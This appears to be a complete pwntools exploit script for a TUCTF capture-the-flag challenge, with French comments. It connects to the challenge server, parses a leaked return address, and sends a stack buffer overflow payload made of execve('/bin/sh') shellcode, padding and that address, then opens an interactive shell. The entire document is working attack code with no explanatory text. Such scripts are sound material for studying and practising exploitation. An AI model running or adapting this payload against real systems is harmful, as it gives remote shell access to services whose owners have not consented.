`#coding: utf-8
from pwn import *

IP = "chal.tuctf.com"
PORT = 30507

p = remote(IP, PORT)

ret = ""
pad = 40 #Padding pour réecrire le EIP

# Shellcode 64 : https://www.exploit-db.com/exploits/36858
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69" \
            "\x6e\x2f\x2f\x73\x68\x56\x53" \
            "\x54\x5f\x6a\x3b\x58\x31\xd2" \
            "\x0f\x05"

#Récupère l'adresse EIP
leak_ret = p.readuntil(">").split("\n")[1]
leak_ret = int(leak_ret, 16)

# Shellcode + Padding + RET_EIP
payload = shellcode+"A"*(pad-len(shellcode))+p64(leak_ret)*2

p.send(payload)
p.interactive()`
